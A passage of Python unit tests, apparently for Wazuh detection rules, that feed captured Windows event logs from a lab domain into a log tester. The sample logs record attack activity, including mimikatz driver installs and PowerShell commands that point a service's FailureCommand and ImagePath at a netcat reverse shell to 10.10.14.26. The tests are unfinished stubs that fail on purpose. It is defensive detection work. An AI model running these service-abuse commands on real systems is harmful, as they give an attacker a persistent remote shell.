            r'''{"win": {"system": {"providerName": "Service Control Manager", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "eventID": "7045", "version": "0", "level": "4", "task": "0", "opcode": "0", "keywords": "0x8080000000000000", "systemTime": "2020-12-17T10:38:33.9511809Z", "eventRecordID": "337870", "processID": "672", "threadID": "10348", "channel": "System", "computer": "jump01.offsec.lan", "severityValue": "INFORMATION", "message": "A service was installed in the system.\n\nService Name:  WCESERVICE\nService File Name:  D:\\Service\\test.exe\nService Type:  user mode service\nService Start Type:  demand start\nService Account:  LocalSystem"}, "eventdata": {"serviceName": "WCESERVICE", "imagePath": "D:\\Service\\test.exe", "serviceType": "user mode service", "startType": "demand start", "accountName": "LocalSystem"}}}''',
            r'''{"win": {"system": {"providerName": "Service Control Manager", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "eventID": "7045", "version": "0", "level": "4", "task": "0", "opcode": "0", "keywords": "0x8080000000000000", "systemTime": "2021-03-03T10:24:12.4027911Z", "eventRecordID": "388110", "processID": "676", "threadID": "8344", "channel": "System", "computer": "jump01.offsec.lan", "severityValue": "INFORMATION", "message": "A service was installed in the system.\n\nService Name:  Microsoft Office Click-to-Run Service\nService File Name:  \"C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe\" /service\nService Type:  user mode service\nService Start Type:  auto start\nService Account:  LocalSystem"}, "eventdata": {"serviceName": "Microsoft Office Click-to-Run Service", "imagePath": "\"C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe\" /service", "serviceType": "user mode service", "startType": "auto start", "accountName": "LocalSystem"}}}''',
            r'''{"win": {"system": {"providerName": "Service Control Manager", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "eventID": "7045", "version": "0", "level": "4", "task": "0", "opcode": "0", "keywords": "0x8080000000000000", "systemTime": "2021-03-03T10:33:48.1026564Z", "eventRecordID": "388136", "processID": "676", "threadID": "1428", "channel": "System", "computer": "jump01.offsec.lan", "severityValue": "INFORMATION", "message": "A service was installed in the system.\n\nService Name:  Microsoft Search in Bing\nService File Name:  \"C:\\Program Files (x86)\\Microsoft\\Microsoft Search in Bing\\MicrosoftSearchInBing.exe\"\nService Type:  user mode service\nService Start Type:  auto start\nService Account:  LocalSystem"}, "eventdata": {"serviceName": "Microsoft Search in Bing", "imagePath": "\"C:\\Program Files (x86)\\Microsoft\\Microsoft Search in Bing\\MicrosoftSearchInBing.exe\"", "serviceType": "user mode service", "startType": "auto start", "accountName": "LocalSystem"}}}''',
            r'''{"win": {"system": {"providerName": "Service Control Manager", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "eventID": "7045", "version": "0", "level": "4", "task": "0", "opcode": "0", "keywords": "0x8080000000000000", "systemTime": "2021-03-16T15:50:54.5918842Z", "eventRecordID": "426757", "processID": "684", "threadID": "8852", "channel": "System", "computer": "jump01.offsec.lan", "severityValue": "INFORMATION", "message": "A service was installed in the system.\n\nService Name:  Npcap Packet Driver (NPCAP)\nService File Name:  \\SystemRoot\\system32\\DRIVERS\\npcap.sys\nService Type:  kernel mode driver\nService Start Type:  demand start\nService Account:"}, "eventdata": {"serviceName": "Npcap Packet Driver (NPCAP)", "imagePath": "\\SystemRoot\\system32\\DRIVERS\\npcap.sys", "serviceType": "kernel mode driver", "startType": "demand start"}}}''',
            r'''{"win": {"system": {"providerName": "Service Control Manager", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "eventID": "7045", "version": "0", "level": "4", "task": "0", "opcode": "0", "keywords": "0x8080000000000000", "systemTime": "2021-03-26T16:12:22.2001192Z", "eventRecordID": "453867", "processID": "684", "threadID": "10560", "channel": "System", "computer": "jump01.offsec.lan", "severityValue": "INFORMATION", "message": "A service was installed in the system.\n\nService Name:  mimikatz driver (mimidrv)\nService File Name:  C:\\TOOLS\\Security_tool\\Mimikatz-fev-2020\\mimidrv.sys\nService Type:  kernel mode driver\nService Start Type:  auto start\nService Account:"}, "eventdata": {"serviceName": "mimikatz driver (mimidrv)", "imagePath": "C:\\TOOLS\\Security_tool\\Mimikatz-fev-2020\\mimidrv.sys", "serviceType": "kernel mode driver", "startType": "auto start"}}}''',
            r'''{"win": {"system": {"providerName": "Service Control Manager", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "eventID": "7045", "version": "0", "level": "4", "task": "0", "opcode": "0", "keywords": "0x8080000000000000", "systemTime": "2021-03-26T16:17:35.4899203Z", "eventRecordID": "453879", "processID": "684", "threadID": "1164", "channel": "System", "computer": "jump01.offsec.lan", "severityValue": "INFORMATION", "message": "A service was installed in the system.\n\nService Name:  mimikatz driver (mimidrv)\nService File Name:  C:\\TOOLS\\Security_tool\\Mimikatz-fev-2020\\mimidrv.sys\nService Type:  kernel mode driver\nService Start Type:  auto start\nService Account:"}, "eventdata": {"serviceName": "mimikatz driver (mimidrv)", "imagePath": "C:\\TOOLS\\Security_tool\\Mimikatz-fev-2020\\mimidrv.sys", "serviceType": "kernel mode driver", "startType": "auto start"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id7045_random_service_installation(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Eventlog", "providerGuid": "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}", "eventID": "104", "version": "0", "level": "4", "task": "104", "opcode": "0", "keywords": "0x8000000000000000", "systemTime": "2020-07-11T21:49:56.3188855Z", "eventRecordID": "9458", "processID": "676", "threadID": "2800", "channel": "System", "computer": "fs02.offsec.lan", "severityValue": "INFORMATION", "message": "The System log file was cleared."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Service Control Manager", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "eventID": "7045", "version": "0", "level": "4", "task": "0", "opcode": "0", "keywords": "0x8080000000000000", "systemTime": "2020-07-11T21:50:07.2137635Z", "eventRecordID": "9459", "processID": "456", "threadID": "300", "channel": "System", "computer": "fs02.offsec.lan", "severityValue": "INFORMATION", "message": "A service was installed in the system.\n\nService Name:  bad-task\nService File Name:  virus\u00e9.exe\nService Type:  user mode service\nService Start Type:  demand start\nService Account:  LocalSystem"}, "eventdata": {"serviceName": "bad-task", "imagePath": "virus\u00e9.exe", "serviceType": "user mode service", "startType": "demand start", "accountName": "LocalSystem"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id800_4103_4104_service_abuse_with_failure_command(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "PowerShell", "providerGuid": {"@Name": "PowerShell"}, "eventID": "800", "version": "0", "level": "4", "task": "8", "opcode": "0", "keywords": "0x80000000000000", "systemTime": "2021-10-07T18:30:51.2241404Z", "eventRecordID": "1172290", "processID": "0", "threadID": "0", "channel": "Windows PowerShell", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "Pipeline execution details for command line: . \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=2438\n\n\tUserId=OFFSEC\\admmig\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\n\tPipelineId=183\n\tScriptName=\n\tCommandLine= \n\nDetails: \nCommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\""}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4103", "version": "1", "level": "4", "task": "106", "opcode": "20", "keywords": "0x0", "systemTime": "2021-10-07T18:30:51.2373313Z", "eventRecordID": "1341625", "processID": "1636", "threadID": "9868", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 183\n        Command Name = PSConsoleHostReadLine\n        Command Type = Function\n        Script Name = \n        Command Path = \n        Sequence Number = 2439\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:"}, "eventdata": {"contextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 183\n        Command Name = PSConsoleHostReadLine\n        Command Type = Function\n        Script Name = \n        Command Path = \n        Sequence Number = 2439\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell", "payload": "CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\""}}}''',
            r'''{"win": {"system": {"providerName": "PowerShell", "providerGuid": {"@Name": "PowerShell"}, "eventID": "800", "version": "0", "level": "4", "task": "8", "opcode": "0", "keywords": "0x80000000000000", "systemTime": "2021-10-07T18:30:51.2397899Z", "eventRecordID": "1172291", "processID": "0", "threadID": "0", "channel": "Windows PowerShell", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "Pipeline execution details for command line: Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name FailureCommand -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\". \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=2444\n\n\tUserId=OFFSEC\\admmig\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\n\tPipelineId=184\n\tScriptName=\n\tCommandLine=Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name FailureCommand -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\" \n\nDetails: \nCommandInvocation(Set-ItemProperty): \"Set-ItemProperty\"\nParameterBinding(Set-ItemProperty): name=\"Path\"; value=\"HKLM:\\System\\CurrentControlSet\\services\\xboxgip\"\nParameterBinding(Set-ItemProperty): name=\"Name\"; value=\"FailureCommand\"\nParameterBinding(Set-ItemProperty): name=\"Value\"; value=\"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\""}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "PowerShell", "providerGuid": {"@Name": "PowerShell"}, "eventID": "800", "version": "0", "level": "4", "task": "8", "opcode": "0", "keywords": "0x80000000000000", "systemTime": "2021-10-07T18:30:51.2397899Z", "eventRecordID": "1172292", "processID": "0", "threadID": "0", "channel": "Windows PowerShell", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "Pipeline execution details for command line: . \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=2448\n\n\tUserId=OFFSEC\\admmig\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\n\tPipelineId=184\n\tScriptName=\n\tCommandLine= \n\nDetails: \nCommandInvocation(Out-Default): \"Out-Default\""}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4104", "version": "1", "level": "5", "task": "2", "opcode": "15", "keywords": "0x0", "systemTime": "2021-10-07T18:30:51.2471027Z", "eventRecordID": "1341626", "processID": "1636", "threadID": "9868", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "win10-02.offsec.lan", "severityValue": "VERBOSE", "message": "Creating Scriptblock text (1 of 1):\nSet-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name FailureCommand -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"\n\nScriptBlock ID: 0654a304-20aa-4c04-b6b9-8f5bc13220bb\nPath:"}, "eventdata": {"messageNumber": "1", "messageTotal": "1", "scriptBlockText": "Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name FailureCommand -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"", "scriptBlockId": "0654a304-20aa-4c04-b6b9-8f5bc13220bb"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4103", "version": "1", "level": "4", "task": "106", "opcode": "20", "keywords": "0x0", "systemTime": "2021-10-07T18:30:51.2519802Z", "eventRecordID": "1341627", "processID": "1636", "threadID": "9868", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "CommandInvocation(Set-ItemProperty): \"Set-ItemProperty\"\nParameterBinding(Set-ItemProperty): name=\"Path\"; value=\"HKLM:\\System\\CurrentControlSet\\services\\xboxgip\"\nParameterBinding(Set-ItemProperty): name=\"Name\"; value=\"FailureCommand\"\nParameterBinding(Set-ItemProperty): name=\"Value\"; value=\"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 184\n        Command Name = Set-ItemProperty\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 2445\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:"}, "eventdata": {"contextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 184\n        Command Name = Set-ItemProperty\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 2445\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell", "payload": "CommandInvocation(Set-ItemProperty): \"Set-ItemProperty\"\nParameterBinding(Set-ItemProperty): name=\"Path\"; value=\"HKLM:\\System\\CurrentControlSet\\services\\xboxgip\"\nParameterBinding(Set-ItemProperty): name=\"Name\"; value=\"FailureCommand\"\nParameterBinding(Set-ItemProperty): name=\"Value\"; value=\"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\""}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4103", "version": "1", "level": "4", "task": "106", "opcode": "20", "keywords": "0x0", "systemTime": "2021-10-07T18:30:51.2523607Z", "eventRecordID": "1341628", "processID": "1636", "threadID": "9868", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "CommandInvocation(Out-Default): \"Out-Default\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 184\n        Command Name = \n        Command Type = Script\n        Script Name = \n        Command Path = \n        Sequence Number = 2449\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:"}, "eventdata": {"contextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 184\n        Command Name = \n        Command Type = Script\n        Script Name = \n        Command Path = \n        Sequence Number = 2449\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell", "payload": "CommandInvocation(Out-Default): \"Out-Default\""}}}''',
            r'''{"win": {"system": {"providerName": "PowerShell", "providerGuid": {"@Name": "PowerShell"}, "eventID": "800", "version": "0", "level": "4", "task": "8", "opcode": "0", "keywords": "0x80000000000000", "systemTime": "2021-10-07T18:30:51.2554108Z", "eventRecordID": "1172293", "processID": "0", "threadID": "0", "channel": "Windows PowerShell", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "Pipeline execution details for command line:     Microsoft.PowerShell.Core\\Set-StrictMode -Off\n. \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=2463\n\n\tUserId=OFFSEC\\admmig\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\n\tPipelineId=186\n\tScriptName=C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\n\tCommandLine=    Microsoft.PowerShell.Core\\Set-StrictMode -Off\n \n\nDetails: \nCommandInvocation(Set-StrictMode): \"Set-StrictMode\"\nParameterBinding(Set-StrictMode): name=\"Off\"; value=\"True\""}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4104", "version": "1", "level": "5", "task": "2", "opcode": "15", "keywords": "0x0", "systemTime": "2021-10-07T18:30:51.2663236Z", "eventRecordID": "1341629", "processID": "1636", "threadID": "9868", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "win10-02.offsec.lan", "severityValue": "VERBOSE", "message": "Creating Scriptblock text (1 of 1):\nprompt\n\nScriptBlock ID: 02523ed7-a302-4032-88c8-d5d52f7addd7\nPath:"}, "eventdata": {"messageNumber": "1", "messageTotal": "1", "scriptBlockText": "prompt", "scriptBlockId": "02523ed7-a302-4032-88c8-d5d52f7addd7"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4103", "version": "1", "level": "4", "task": "106", "opcode": "20", "keywords": "0x0", "systemTime": "2021-10-07T18:30:51.2693337Z", "eventRecordID": "1341630", "processID": "1636", "threadID": "9868", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\nParameterBinding(Set-StrictMode): name=\"Off\"; value=\"True\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 186\n        Command Name = Set-StrictMode\n        Command Type = Cmdlet\n        Script Name = C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\n        Command Path = \n        Sequence Number = 2464\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:"}, "eventdata": {"contextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 186\n        Command Name = Set-StrictMode\n        Command Type = Cmdlet\n        Script Name = C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\n        Command Path = \n        Sequence Number = 2464\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell", "payload": "CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\nParameterBinding(Set-StrictMode): name=\"Off\"; value=\"True\""}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id800_4103_4104_service_abuse_with_malicious_path(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "PowerShell", "providerGuid": {"@Name": "PowerShell"}, "eventID": "800", "version": "0", "level": "4", "task": "8", "opcode": "0", "keywords": "0x80000000000000", "systemTime": "2021-10-07T18:21:36.8605238Z", "eventRecordID": "1172261", "processID": "0", "threadID": "0", "channel": "Windows PowerShell", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "Pipeline execution details for command line: . \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=2346\n\n\tUserId=OFFSEC\\admmig\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\n\tPipelineId=173\n\tScriptName=\n\tCommandLine= \n\nDetails: \nCommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\""}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4103", "version": "1", "level": "4", "task": "106", "opcode": "20", "keywords": "0x0", "systemTime": "2021-10-07T18:21:36.8646980Z", "eventRecordID": "1341591", "processID": "1636", "threadID": "9868", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 173\n        Command Name = PSConsoleHostReadLine\n        Command Type = Function\n        Script Name = \n        Command Path = \n        Sequence Number = 2347\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:"}, "eventdata": {"contextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 173\n        Command Name = PSConsoleHostReadLine\n        Command Type = Function\n        Script Name = \n        Command Path = \n        Sequence Number = 2347\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell", "payload": "CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\""}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4104", "version": "1", "level": "5", "task": "2", "opcode": "15", "keywords": "0x0", "systemTime": "2021-10-07T18:21:36.8897762Z", "eventRecordID": "1341592", "processID": "1636", "threadID": "9868", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "win10-02.offsec.lan", "severityValue": "VERBOSE", "message": "Creating Scriptblock text (1 of 1):\nSet-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name ImagePath -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"\n\nScriptBlock ID: e3b09c38-03f2-4932-b5a6-737f7bcca7cc\nPath:"}, "eventdata": {"messageNumber": "1", "messageTotal": "1", "scriptBlockText": "Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name ImagePath -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"", "scriptBlockId": "e3b09c38-03f2-4932-b5a6-737f7bcca7cc"}}}''',
            r'''{"win": {"system": {"providerName": "PowerShell", "providerGuid": {"@Name": "PowerShell"}, "eventID": "800", "version": "0", "level": "4", "task": "8", "opcode": "0", "keywords": "0x80000000000000", "systemTime": "2021-10-07T18:21:37.1337680Z", "eventRecordID": "1172262", "processID": "0", "threadID": "0", "channel": "Windows PowerShell", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "Pipeline execution details for command line: Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name ImagePath -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\". \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=2352\n\n\tUserId=OFFSEC\\admmig\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\n\tPipelineId=174\n\tScriptName=\n\tCommandLine=Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name ImagePath -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\" \n\nDetails: \nCommandInvocation(Set-ItemProperty): \"Set-ItemProperty\"\nParameterBinding(Set-ItemProperty): name=\"Path\"; value=\"HKLM:\\System\\CurrentControlSet\\services\\xboxgip\"\nParameterBinding(Set-ItemProperty): name=\"Name\"; value=\"ImagePath\"\nParameterBinding(Set-ItemProperty): name=\"Value\"; value=\"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\""}, "eventdata": {}}}''',
